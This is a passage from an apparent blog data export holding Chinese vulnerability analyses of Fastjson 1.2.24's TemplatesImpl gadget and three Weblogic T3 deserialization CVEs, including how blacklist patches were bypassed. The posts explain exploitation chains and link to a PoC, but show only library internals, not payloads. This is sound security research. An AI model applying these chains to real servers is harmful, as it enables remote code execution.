src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/ec061c3b3c86c1b3a02482df692a8eea.png\"></p>\n<p>可见，loader.defineClass方法其实就是对ClassLoader.defineClass的重写。defineClass方法可以从传入的字节码转化为Class</p>\n<p>回头分析下上述流程</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5fae284f08e0da8a0517fa9f43990c80.png\"></p>\n<p>_bytecodes变量非空值时，程序将会把_bytecodes数组中的值循环取出，使用loader.defineClass方法从字节码转化为Class对象，随后后赋值给_class[i]。如果此时的class为main class，_transletIndex变量值则会是此时_bytecodes数组中的下标值.因此当我们构造出_bytecodes:[evilCode]这样的json字符串（evilCode字符串为我们构造的恶意类的字节码）后，程序会将evilCode化为Class对象后赋值给_class[0]</p>\n<p>现在回到getTransletInstance()方法中</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/7485cd6227bab22112407edb3fc801c2.png\"></p>\n<p>此时的_class[_transletIndex]即为我们构造传入的evilCode类.程序通过调用evilCode类的newInstance()方法来实例化对象的操作，这将导致我们构造的evilCode类中的恶意代码被执行.但在此之前，需要在poc构造json字符串时使得成员变量_name不为空，否则程序还未执行到将evilCode类实例化就提前return</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/36340dd97c18b7074c08d30fd9fce4b7.png\"></p>\n<p>注意：由于私有变量_name没有setter方法，在反序列化时想给这个变量赋值则需要使用Feature.SupportNonPublicField参数。</p>\n<p>在分析完存在漏洞的getTransletInstance方法，我们需要找到一条调用链，这条调用链需要在使用fastjson处理json字符串时成功串连到存在漏洞的getTransletInstance方法上。我们继续向上跟踪代码</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a99fa86415c1e44425807b808c4feff6.png\"></p>\n<p>com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java中newTransformer()方法中调用了getTransletInstance()。继续向上跟踪</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/873e4c395da9922f4755f03fdb6142e5.png\"></p>\n<p>com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java getOutputProperties()方法中调用了newTransformer()</p>\n<p>getOutputProperties()方法为_outputProperties成员变量的getter方法</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/26c8c8cf214c6def1efa536683527acf.png\"></p>\n<p>细心的读者可能会发现，成员变量_outputProperties与其getter方法getOutputProperties()方法名字并不完全一致，多了一个下划线，fastjson是如何将其对应的呢？实际上，fastjson在解析的时候调用了一个smartMatch() 方法</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/6864c0cd6b84a6dbcf73d21ba3803c9c.png\"></p>\n<p>在寻找_outputProperties的getter方法时，程序将下划线置空，从而产生了成员变量_outputProperties与getter方法getOutputProperties()对应的形式</p>\n<h2 id=\"FastJson与TemplatesImpl的有趣结合\"><a href=\"#FastJson与TemplatesImpl的有趣结合\" class=\"headerlink\" title=\"FastJson与TemplatesImpl的有趣结合\"></a>FastJson与TemplatesImpl的有趣结合</h2><p>首先说TemplatesImpl类。经过上文分析可发现：TemplatesImpl中存在一个反序列化利用链，在反序列化过程中，如果该类的getOutputProperties()方法被调用，即可成功触发代码执行漏洞。</p>\n<p>再来分析下FastJson：经过上文对FastJson三种不同途径处理JSON字符串时关于getter方法被调用的条件来看，TemplatesImpl类_outputProperties成员变量的getter方法满足被调用条件。无论通过fastjson哪种方式解析json字符串，都会触发getOutputProperties()方法。</p>\n<p>二者放在一起一拍即合：FastJson在反序列化TemplatesImpl类时会恰好触发TemplatesImpl类的getOutputProperties()方法；TemplatesImpl类的getOutputProperties()方法被触发就会引起反序列化代码执行漏洞。所以说这个漏洞利用很是巧妙。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>针对Fastjson 1.2.24反序列化漏洞的利用方式有很多，本文由于篇幅有限仅对比较巧妙的TemplatesImpl攻击调用链路进行举例。后续将会对Fastjson历史漏洞进行详细的分析，希望大家喜欢。</p>\n"},{"title":"从Weblogic原理上探究CVE-2015-4852、CVE-2016-0638、CVE-2016-3510究竟怎么一回事","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/f6558fecd77be00c3616a9af8cb74f7.jpg","date":"2020-10-27T08:04:58.000Z","_content":"\n目前。网上关于CVE-2015-4852漏洞的资料很多，但是针对CVE-2015-4852漏洞如何修复，修复补丁又是如何生效的却少之又少；而CVE-2016-0638、CVE-2016-3510这两个漏洞又是如何绕过CVE-2015-4852补丁的，则只是在介绍Weblogic系列漏洞时被一句话带过。\n\nCVE-2015-4852、CVE-2016-0638以及CVE-2016-3510，这三个漏洞有着极其相似的地方，其本质就是利用了Weblogic反序列化机制，而官方在修复CVE-2015-4852时，也并未对这个机制进行调整，而仅仅是在此基础上增加了一个关卡：黑名单。\n\n因此，在彻底搞清楚Weblogic反序列化漏洞的原理以及如何修复这个问题之前，很有必要弄清楚Weblogic处理流量中的java反序列化数据的流程。只有清楚了这一点，才能很好的理解如下几个问题：\n\n1.  CVE-2015-4852是如何产生的以及后续是如何修复的？\n\n2.  修复CVE-2015-4852，为何要在resolveClass:108,InboundMsgAbbrev\\$ServerChannelInputStream (weblogic.rjvm)处添加黑名单？\n\n3.  CVE-2016-0638、CVE-2016-3510是如何绕过修复？二者的绕过方式有何相同与不同？\n\nWeblogic 反序列化攻击时序\n-------------------------\n\n为了搞清楚CVE-2015-4852、CVE-2016-0638、CVE-2016-3510中的种种疑团，我们需要首先来弄明白一些原理性的东西，我们先从Weblogic\n反序列化攻击时序入手，看看Weblogic是如何从流量中将序列化字节码进行反序列化。\n\n首先贴出一张Weblogic 反序列化攻击时序图\n\n![f165b1f00063791e06a1dbd615604c52.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155439-aa3a40c0-1829-1.png)\n\n这张图是从我的好朋友廖新喜大佬博客扒下来的，也欢迎大家去读一读他的关于java漏洞的分析文章：\n\nhttp://xxlegend.com/2018/06/20/%E5%85%88%E7%9F%A5%E8%AE%AE%E9%A2%98%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98%20%E8%A7%A3%E8%AF%BB/\n\n上图为一张完整的Weblogic反序列化攻击时序图，庞大而且繁杂，不如我们将其拆分开，首先说说Weblogic如何从流量数据取出序列化数据并获取其类对象的过程。\n\n从流量数据到Class对象\n---------------------\n\n首先我们来看一张图：\n\n![ccd71bc1337e47616a30ed30beaa656c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155452-b1e5a580-1829-1.png)\n\nWeblogic通过7001端口，获取到流量中T3协议的java反序列化数据。从上图中readObject开始，经过流程中的一步步的加工，并最终于上图流程终点处的resolveProxyClass或resolveClass处将流量中的代理类/类类型的字节流转变为了对应的Class对象。\n\n首先我们可以发现：在ObjectInputStream (java.io)中的readClassDesc方法处，存在着分叉点，导致了序列化流量流向了两个不同的分支：其中一些流量流向了readProxyDesc并最终采用resolveProxyClass获取类对象，而另一些则流向了readNonProxyDesc并最终使用resolveClass获取类对象。\n\n### readClassDesc是什么？\n\n从上文来看，流量数据经过readClassDesc并驶入了不同的处理分支。\n\n首先来看一下readClassDesc方法的官方注释：“readClassDesc方法读入并返回（可能为null）类描述符。将passHandle设置为类描述符的已分配句柄。”\n\n如果想理解官方注释的含义，需要扩充一些java序列化的知识：\n\njava序列化数据在流量传输，并不是随随便便杂乱无章的，序列化数据的格式是要遵循序列化流协议。\n\n序列化流协议定义了字节流中传输的对象的基本结构。该协议定义了对象的每个属性：其类，其字段以及写入的数据，以及以后由类特定的方法读取的数据。\n\n字节流中对象的表示可以用一定的语法格式来描述。对于空对象，新对象，类，数组，字符串和对流中已有对象的反向引用，都有特殊的表示形式。比如说在字节流中传递的序列化数据中，字符串有字符串类型的特定格式、对象有对象类型的特定格式、类结构有着类结构。而TC_STRING、TC_OBJECT、TC_CLASSDESC则是他们的描述符，他们标识了接下来这段字节流中的数据是什么类型格式的\n\n以TC_CLASSDESC为例，TC_CLASSDESC在流量中的值是(byte)0x72，在序列化流协议中，当这个值出现后，代表接下来的数据将开始一段Class的描述(DESC=description)，即TC_CLASSDESC描述符(byte)0x72后面的字节流数据为Class类型。通过这些描述符，程序可以正确的解析流量中的序列化数据。\n\n如果对这部分感兴趣，可以参照oracle文档：\n\nhttps://www.oracle.com/security-alerts/cpuoct2020traditional.html\n\nreadClassDesc的功能很简单：读入字节流，通过读取字节流中的描述符来确定字节流中传递数据的类型，并交给对应的方法进行处理。\n\n接下来我们看看readClassDesc的实现\n\n```java\n    private ObjectStreamClass readClassDesc(boolean unshared) \n\tthrows IOException \n    {\n\tbyte tc = bin.peekByte();\n\tswitch (tc) {\n\t    case TC_NULL:\n\t\treturn (ObjectStreamClass) readNull();\n\n\t    case TC_REFERENCE:\n\t\treturn (ObjectStreamClass) readHandle(unshared);\n\n\t    case TC_PROXYCLASSDESC:\n\t\treturn readProxyDesc(unshared);\n\n\t    case TC_CLASSDESC:\n\t\treturn readNonProxyDesc(unshared);\n\t\t\n\t    default:\n\t\tthrow new StreamCorruptedException(\n\t\t    String.format(\"invalid type code: %02X\", tc));\n\t}\n    }\n```\n\n从readClassDesc方法的实现可见，readClassDesc中switch语句有5个分支（TC_NULL、TC_REFERENCE、TC_PROXYCLASSDESC、TC_CLASSDESC、default）。\n\n```\nTC_NULL描述符表示空对象引用\n\nTC_REFERENCE描述符表示引用已写入流的对象\n\nTC_PROXYCLASSDESC是新的代理类描述符\n\nTC_CLASSDESC是新的类描述符\n```\n\n那么我们为什么在上文流程图里只画出了其中两处分支（TC_PROXYCLASSDESC、TC_CLASSDESC）呢？\n\n我们先来看看Weblogic反序列化漏洞成的原理：Weblogic反序列化漏洞是由于通过流量中传入的恶意类而未得到合理的过滤，最终被反序列化而形成。\n\n从原理上来看，是weblogic对流量中序列化后的类对象处理时出现的问题。\n\n基于这一点，我们应重点关注程序是如何从流量中获取并处理类类型数据的流程。\n\nTC_PROXYCLASSDESC与TC_CLASSDESC描述符标识了流量中代理类与类这两种类型的数据，因此我们重点关注TC_PROXYCLASSDESC与TC_CLASSDESC这两处分支，这也是上文流程图里只有这两处分支的原因。\n\n当readClassDesc从字节流中读取到TC_CLASSDESC描述符，说明此处程序此时要处理的字节流为普通类，程序接下来会调用readNonProxyDesc方法对这段字节流进行解析。\n\n在readNonProxyDesc方法中，程序会从该段序列化流中获取类的序列化描述符ObjectStreamClass（类序列化描述符ObjectStreamClass，其本质是对Class类的包装，可以想象成一个字典，里面记录了类序列化时的一些信息，包括字段的描述信息和serialVersionUID 和需要序列化的字段fields，以便在反序列化时拿出来使用）。随后该类的序列化描述符被传递给resolveClass方法，resolveClass方法从该类的序列化描述符中获取对应的Class对象。\n\n![6f8788495652b7967dbc4b94b7452790.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155508-bbe2ab14-1829-1.png)\n\n当readClassDesc从字节流中读取到TC_PROXYCLASSDESC描述符时，说明此处程序此时要处理的字节流为动态代理类，程序接下来会调用readProxyDesc方法进行处理，过程与上文一致，不再复述。\n\n我们以此处传入的字节流为普通类为例，接下来看看resolveClass是如何将类的序列化描述符加工成该类的Class对象\n\n位于weblogic/rjvm/InboundMsgAbbrev.class中的resolveClass方法\n\n```java\n        protected Class resolveClass(ObjectStreamClass var1) throws ClassNotFoundException, IOException {\n            Class var2 = super.resolveClass(var1);\n            if (var2 == null) {\n                throw new ClassNotFoundException(\"super.resolveClass returns null.\");\n            } else {\n                ObjectStreamClass var3 = ObjectStreamClass.lookup(var2);\n                if (var3 != null && var3.getSerialVersionUID() != var1.getSerialVersionUID()) {\n                    throw new ClassNotFoundException(\"different serialVersionUID. local: \" + var3.getSerialVersionUID() + \" remote: \" + var1.getSerialVersionUID());\n                } else {\n                    return var2;\n                }\n            }\n        }\n```\n\n程序通过Class var2 = super.resolveClass(var1); 从ObjectStreamClass var1中获取到对应的类对象，并赋值给var2，最终通过执行return var2，将var1序列化描述符所对应的Class对象返回\n\n我们以熟悉的CVE-2015-4852利用链为例，动态调试一下resolveClass方法\n\n![b35be97a6451bd74a8868173bdd629d0.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155521-c3a488ae-1829-1.png)\n\n可见resolveClass方法成功从序列化描述符中获取到”sun.reflect.annotation.AnnotationInvocationHandler”类对象，并将其返回\n\n到目前为止，我们已经搞明白了weblogic如何将流量中的类字节流转变为对应的Class对象。以上这部分知识，有助于我们理解Weblogic官方的修复方案。而接下来我们要谈论的是在Weblogic获得到Class对象后要做的事情，通过对这部分流程的理解，将会帮助你很轻松的理解为什么CVE-2015-4852、CVE-2016-0638、CVE-2016-3510的poc是如何奏效的。\n\n从Class对象到代码执行\n---------------------\n\n通过上文的介绍可知，程序通过resolveClass获取Class对象，在resolveClass方法将获取到的Class对象返回后，上一级的readNonProxyDesc在接收到resolveClass方法返回值后，连同之前从流量中获取类的序列化描述符ObjectStreamClass一并，初始化并构建一个新的ObjectStreamClass，这个流程如下：\n\n![image-20201029110755721](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/image-20201029110755721.png)\n\n关键部分代码如下\n\n```java\nprivate ObjectStreamClass readNonProxyDesc(boolean unshared) \nthrows IOException \n   {\n...\n\nObjectStreamClass desc = new ObjectStreamClass();\n...\n\nObjectStreamClass readDesc = null;\n...\n    readDesc = readClassDescriptor();\n...\n\nClass cl = null;\n...\n    if ((cl = resolveClass(readDesc)) == null) {\n   resolveEx = new ClassNotFoundException(\"null class\");\n    }\n...\ndesc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(false));\n\n...\nreturn desc;\n   }\n```\n\n结合流程图与代码来看，readNonProxyDesc方法中主要做了如下这些事情\n\n1、通过readClassDescriptor()方法从流量中获取序列化类的ObjectStreamClass并赋值给readDesc变量\n\n2、将readDesc传入resolveClass，获取该类的Class对象并赋值给cl变量\n\n3、将该类的ObjectStreamClass与Class对象传入initNonProxy方法，初始化一个ObjectStreamClass并赋值给desc变量\n\n4、将desc变量返回\n\n\n\nreadNonProxyDesc方法中返回的ObjectStreamClass类型的desc变量，将会传递给readClassDesc，进而被readClassDesc传递给readOrdinaryObject\n\nreadOrdinaryObject、readClassDesc与readNonProxyDesc的调用关系如下：\n\n\n\nreadOrdinaryObject中调用readClassDesc:\n\n```java\nprivate Object readOrdinaryObject(boolean unshared) \nthrows IOException \n   {\n...\n\nObjectStreamClass desc = readClassDesc(false);\n...\n```\n\n\n\nreadClassDesc中调用readNonProxyDesc:\n\n```java\nprivate ObjectStreamClass readClassDesc(boolean unshared) \nthrows IOException \n   {\nbyte tc = bin.peekByte();\nswitch (tc) {\n...\n    case TC_CLASSDESC:\n   return readNonProxyDesc(unshared);\n```\n\n\n\n因此，当readNonProxyDesc中ObjectStreamClass类型的desc变量返回后，途径readClassDesc方法的最终传递给readOrdinaryObject中的desc变量\n\n接下来看看readOrdinaryObject方法中部分片段\n\n```java\nObjectStreamClass desc = readClassDesc(false);\n...\n    obj = desc.isInstantiable() ? desc.newInstance() : null;\n...\nif (desc.isExternalizable()) {\n    readExternalData((Externalizable) obj, desc);\n} else {\n    readSerialData(obj, desc);\n}\n\nhandles.finish(passHandle);\n\nif (obj != null && \n    handles.lookupException(passHandle) == null &&\n    desc.hasReadResolveMethod())\n{\n    Object rep = desc.invokeReadResolve(obj);\n```\n\n上述代码中的第一行：\n\n```java\nObjectStreamClass desc = readClassDesc(false);\n```\n\n代码中由readClassDesc(false)执行得到的desc，即是readNonProxyDesc中获取并返回的ObjectStreamClass类型的desc\n\n```java\nobj = desc.isInstantiable() ? desc.newInstance() : null;\n```\n\n代码中接下来的条件分支，即是在获取了ObjectStreamClass类型的desc后，readOrdinaryObject接着尝试调用类对象中的readObject、readResolve、readExternal等方法。\n\n关于readObject、readResolve、readExternal等方法的调用，将其整理成流程图，有助于对其更好的理解，流程图如下：\n\n![54e51374e255a9c4b137acc1d0cbd56c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155537-cca7961c-1829-1.png)\n\n在Weblogic从流量中的序列化类字节段通过readClassDesc-readNonProxyDesc-resolveClass获取到普通类序列化数据的类对象后，程序依次尝试调用类对象中的readObject、readResolve、readExternal等方法。\n\n在这里提前透露下，CVE-2015-4852、CVE-2016-0638、CVE-2016-3510这三个漏洞，所利用的恰好依次是恶意类”sun.reflect.annotation.AnnotationInvocationHandler”中的readObject、”weblogic.jms.common.StreamMessageImpl”中的readExternal、以及”weblogic.corba.utils.MarshalledObject”中的readResolve方法\n\n试想一下这个场景：在没有任何防护或防护不当的时候，攻击者通过流量中传入恶意类的序列化数据，weblogic将流量中的序列化数据还原为其对应的Class对象，并尝试执行恶意类中的readObject、readResolve、readExternal等方法。这就是CVE-2015-4852、CVE-2016-0638、CVE-2016-3510漏洞的核心。\n\nCVE-2015-4852\n-------------\n\n在分析过流程之后，这个漏洞呼之欲出。简单来说，在CVE-2015-4852漏洞爆发之前，weblogic对流量中的序列化数据没有任何的校验，长驱直入的恶意数据最终被还原出其Class对象，并被Weblogic调用了其Class对象中的readObject方法，结合CVE-2015-4852细节来说就是：\n\n1.  精心构造的ChainedTransformer恶意链（以下简称恶意数据）\n\n2.  将构造好的恶意数据包裹在AnnotationInvocationHandler类的memberValues变量中\n\n3.  在流量中构造并传入上述制作好的AnnotationInvocationHandler类的序列化数据\n\n4.  Weblogic获取AnnotationInvocationHandler类的Class对象\n\n5.  Weblogic尝试调用AnnotationInvocationHandler类的readObject方法\n\n6.  AnnotationInvocationHandler类中readObject中存在一些有助于漏洞利用的操作（AnnotationInvocationHandler的readObject方法中对其memberValues的每一项调用了setValue方法进而调用了checkSetValue）\n\n7.  恶意数据存放在memberValues中伺机而动。恶意数据的原理我们就不细说了，简单来说就是，当恶意数据的checkSetValue被触发，就能造成命令执行\n\n8.  等到readObject方法对memberValues的每一项调用setValue方法执行时，setValue方法会进而调用并触发恶意数据的checkSetValue，造成命令执行\n\n![e92fbde69bafb5ac777da44e96bd9d9a.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155550-d4cf730a-1829-1.png)\n\nWeblogic的防护机制\n------------------\n\nCVE-2015-4852这个漏洞利用出现之后，官方对Weblogic进行了一些改造，增加了一些安全防护。至于怎么防护，说起来很简单，以普通类为例，见下图：\n\n![10b6817babd9d985caefe76cc0623ac0.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155559-da0eb3b2-1829-1.png)\n\nresolveClass方法的作用是从类序列化描述符获取类的Class对象，在resolveClass中增加一个检查，检查一下该类的序列化描述符中记录的类名是否在黑名单上，如果在黑名单上，直接抛出错误，不允许获取恶意的类的Class对象。这样以来，恶意类连生成Class对象的机会都没有，更何况要执行恶意类中的\nreadObject、readResolve、readExternal呢。\n\n我们看一下具体是怎么实现的，见下图：\n\n![b95c0a9e24b511213e076e61a069e12f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155626-e9e7005a-1829-1.png)\n\n可见更新之后多出了一个if条件分支，通过isBlackListed校验传入的类名用来处理代理类的resolveProxyClass也是一样的方式，不再复述。\n\n从整体上来看，检查模块主要在下图红框里\n\n![898634e47e18bace15c0cbba196c9b31.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155635-ef801b3c-1829-1.png)\n\n在修复过后，CVE-2015-4852已经不能成功利用了：CVE-2015-4852所使用到的AnnotationInvocationHandler在黑名单中，会直接报错而不能获取其Class对象，更不能执行其中的readObject。\n\nCVE-2016-0638\n-------------\n\n这个漏洞主要是找到了个黑名单之外的类\"weblogic.jms.common.StreamMessageImpl\"\n\n简单来说，由于黑名单的限制，CVE-2015-4852利用链没法直接使用，这个漏洞像是整了个套娃，给CVE-2015-4852装进去了。\n\n为什么使用StreamMessageImpl这个类呢？其实原理也很简单。StreamMessageImpl类中的readExternal方法可以接收序列化数据作为参数，而当StreamMessageImpl类的readExternal执行时，会反序列化传入的参数并执行该参数反序列化后对应类的readObject方法。我们动态调试一下，见下图\n\n![362088fdc6055340600570c83c08993f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155645-f52e107a-1829-1.png)\n\n如果我们把序列化后的CVE-2015-4852利用链序列化之后丢进readExternal呢？\n\n当我们给上图StreamMessageImpl类的readExternal中传入序列化后的CVE-2015-4852利用链，在readExternal被执行时，会将CVE-2015-4852利用链数据反序列化，并在上图864行处调用其readObject方法，也就是AnnotationInvocationHandler的readObject方法\n\n好了，AnnotationInvocationHandler的readObject方法被调用了，CVE-2015-4852复活了。\n\n但是StreamMessageImpl类的readExternal要怎么被执行呢?别忘了上文分析的Weblogic反序列化流程，在获取到StreamMessageImpl类的Class对象后，程序可不止调用其readObject方法，还会尝试调用readExternal的。\n\n![9ce6bbce5fae485feaa76654ff515c80.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155655-fb5f308c-1829-1.png)\n\nCVE-2016-3510\n-------------\n\n这个漏洞与上一个几乎一致，也是做了个套娃给CVE-2015-4852利用链装进去了，从而绕过了黑名单限制。\n\n这次找到的是weblogic.corba.utils.MarshalledObject\n\n首先看一下这个类的构造方法\n\n```java\npublic MarshalledObject(Object var1) throws IOException {\n    if (var1 == null) {\n        this.hash = 13;\n    } else {\n        ByteArrayOutputStream var2 = new ByteArrayOutputStream();\n        MarshalledObject.MarshalledObjectOutputStream var3 = new MarshalledObject.MarshalledObjectOutputStream(var2);\n        var3.writeObject(var1);\n        var3.flush();\n        this.objBytes = var2.toByteArray();\n        int var4 = 0;\n\n        for(int var5 = 0; var5 < this.objBytes.length; ++var5) {\n            var4 = 31 * var4 + this.objBytes[var5];\n        }\n\n        this.hash = var4;\n    }\n}\n```\n\n可以发现，这个类的构造方法接收一个Object类型的参数var1，然后将传入的Object参数序列化后转换为byte数组的形式赋值给this.objBytes\n\n我们接下来看看MarshalledObject的readResolve方法\n\n```java\npublic Object readResolve() throws IOException, ClassNotFoundException, ObjectStreamException {\n    if (this.objBytes == null) {\n        return null;\n    } else {\n        ByteArrayInputStream var1 = new ByteArrayInputStream(this.objBytes);\n        ObjectInputStream var2 = new ObjectInputStream(var1);\n        Object var3 = var2.readObject();\n        var2.close();\n        return var3;\n    }\n}\n```\n\n可见，MarshalledObject的readResolve方法将this.objBytes反序列化，并执行其readObject。this.objBytes可以由MarshalledObject构造方法中传入的var参数控制\n\n![d47f1dff5b0fa0d58f49133ceba48d38.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155707-028637ca-182a-1.png)\n\n这样以来，将CVE-2015-4852利用链传入MarshalledObject构造方法中，将MarshalledObject序列化后，则可以将CVE-2015-4852利用链保存在其this.objBytes变量中。当weblogic将构造好的MarshalledObject反序列化时，weblogic将尝试调用MarshalledObject的readResolve方法时，CVE-2015-4852利用链被执行\n\n如果对如何构造的poc细节不是很清楚，可以参照这个链接\n\nhttps://github.com/zhzhdoai/Weblogic_Vuln/blob/master/Weblogic_Vuln/src/main/java/com/weblogcVul/CVE_2016_3510.java\n\n\n\n## 总结\n\nWeblogic的前三个反序列化漏洞并不复杂，但是对其的研究和分析是有一定的方式的，仅仅从单一的漏洞分析入手，很容易看不懂，反而把漏洞弄得复杂化。在了解了漏洞流程之后，再回头来看，这几个漏洞的原理便呼之欲出。","source":"_posts/weblogic-CVE-2015-4852-CVE-2016-0638-CVE-2016-3510.md","raw":"---\ntitle: 从Weblogic原理上探究CVE-2015-4852、CVE-2016-0638、CVE-2016-3510究竟怎么一回事\ntags: web漏洞分析\ncategories: 技术\ntop_img: 'https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg'\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/f6558fecd77be00c3616a9af8cb74f7.jpg\ndate: 2020-10-27 16:04:58\n---\n\n目前。网上关于CVE-2015-4852漏洞的资料很多，但是针对CVE-2015-4852漏洞如何修复，修复补丁又是如何生效的却少之又少；而CVE-2016-0638、CVE-2016-3510这两个漏洞又是如何绕过CVE-2015-4852补丁的，则只是在介绍Weblogic系列漏洞时被一句话带过。\n\nCVE-2015-4852、CVE-2016-0638以及CVE-2016-3510，这三个漏洞有着极其相似的地方，其本质就是利用了Weblogic反序列化机制，而官方在修复CVE-2015-4852时，也并未对这个机制进行调整，而仅仅是在此基础上增加了一个关卡：黑名单。\n\n因此，在彻底搞清楚Weblogic反序列化漏洞的原理以及如何修复这个问题之前，很有必要弄清楚Weblogic处理流量中的java反序列化数据的流程。只有清楚了这一点，才能很好的理解如下几个问题：\n\n1.  CVE-2015-4852是如何产生的以及后续是如何修复的？\n\n2.  修复CVE-2015-4852，为何要在resolveClass:108,InboundMsgAbbrev\\$ServerChannelInputStream (weblogic.rjvm)处添加黑名单？\n\n3.  CVE-2016-0638、CVE-2016-3510是如何绕过修复？二者的绕过方式有何相同与不同？\n\nWeblogic 反序列化攻击时序\n-------------------------\n\n为了搞清楚CVE-2015-4852、CVE-2016-0638、CVE-2016-3510中的种种疑团，我们需要首先来弄明白一些原理性的东西，我们先从Weblogic\n反序列化攻击时序入手，看看Weblogic是如何从流量中将序列化字节码进行反序列化。\n\n首先贴出一张Weblogic 反序列化攻击时序图\n\n![f165b1f00063791e06a1dbd615604c52.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155439-aa3a40c0-1829-1.png)\n\n这张图是从我的好朋友廖新喜大佬博客扒下来的，也欢迎大家去读一读他的关于java漏洞的分析文章：\n\nhttp://xxlegend.com/2018/06/20/%E5%85%88%E7%9F%A5%E8%AE%AE%E9%A2%98%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98%20%E8%A7%A3%E8%AF%BB/\n\n上图为一张完整的Weblogic反序列化攻击时序图，庞大而且繁杂，不如我们将其拆分开，首先说说Weblogic如何从流量数据取出序列化数据并获取其类对象的过程。\n\n从流量数据到Class对象\n---------------------\n\n首先我们来看一张图：\n\n![ccd71bc1337e47616a30ed30beaa656c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155452-b1e5a580-1829-1.png)\n\nWeblogic通过7001端口，获取到流量中T3协议的java反序列化数据。从上图中readObject开始，经过流程中的一步步的加工，并最终于上图流程终点处的resolveProxyClass或resolveClass处将流量中的代理类/类类型的字节流转变为了对应的Class对象。\n\n首先我们可以发现：在ObjectInputStream (java.io)中的readClassDesc方法处，存在着分叉点，导致了序列化流量流向了两个不同的分支：其中一些流量流向了readProxyDesc并最终采用resolveProxyClass获取类对象，而另一些则流向了readNonProxyDesc并最终使用resolveClass获取类对象。\n\n### readClassDesc是什么？\n\n从上文来看，流量数据经过readClassDesc并驶入了不同的处理分支。\n\n首先来看一下readClassDesc方法的官方注释：“readClassDesc方法读入并返回（可能为null）类描述符。将passHandle设置为类描述符的已分配句柄。”\n\n如果想理解官方注释的含义，需要扩充一些java序列化的知识：\n\njava序列化数据在流量传输，并不是随随便便杂乱无章的，序列化数据的格式是要遵循序列化流协议。\n\n序列化流协议定义了字节流中传输的对象的基本结构。该协议定义了对象的每个属性：其类，其字段以及写入的数据，以及以后由类特定的方法读取的数据。\n\n字节流中对象的表示可以用一定的语法格式来描述。对于空对象，新对象，类，数组，字符串和对流中已有对象的反向引用，都有特殊的表示形式。比如说在字节流中传递的序列化数据中，字符串有字符串类型的特定格式、对象有对象类型的特定格式、类结构有着类结构。而TC_STRING、TC_OBJECT、TC_CLASSDESC则是他们的描述符，他们标识了接下来这段字节流中的数据是什么类型格式的\n\n以TC_CLASSDESC为例，TC_CLASSDESC在流量中的值是(byte)0x72，在序列化流协议中，当这个值出现后，代表接下来的数据将开始一段Class的描述(DESC=description)，即TC_CLASSDESC描述符(byte)0x72后面的字节流数据为Class类型。通过这些描述符，程序可以正确的解析流量中的序列化数据。\n\n如果对这部分感兴趣，可以参照oracle文档：\n\nhttps://www.oracle.com/security-alerts/cpuoct2020traditional.html\n\nreadClassDesc的功能很简单：读入字节流，通过读取字节流中的描述符来确定字节流中传递数据的类型，并交给对应的方法进行处理。\n\n接下来我们看看readClassDesc的实现\n\n```java\n    private ObjectStreamClass readClassDesc(boolean unshared) \n\tthrows IOException \n    {\n\tbyte tc = bin.peekByte();\n\tswitch (tc) {\n\t    case TC_NULL:\n\t\treturn (ObjectStreamClass) readNull();\n\n\t    case TC_REFERENCE:\n\t\treturn (ObjectStreamClass) readHandle(unshared);\n\n\t    case TC_PROXYCLASSDESC:\n\t\treturn readProxyDesc(unshared);\n\n\t    case TC_CLASSDESC:\n\t\treturn readNonProxyDesc(unshared);\n\t\t\n\t    default:\n\t\tthrow new StreamCorruptedException(\n\t\t    String.format(\"invalid type code: %02X\", tc));\n\t}\n    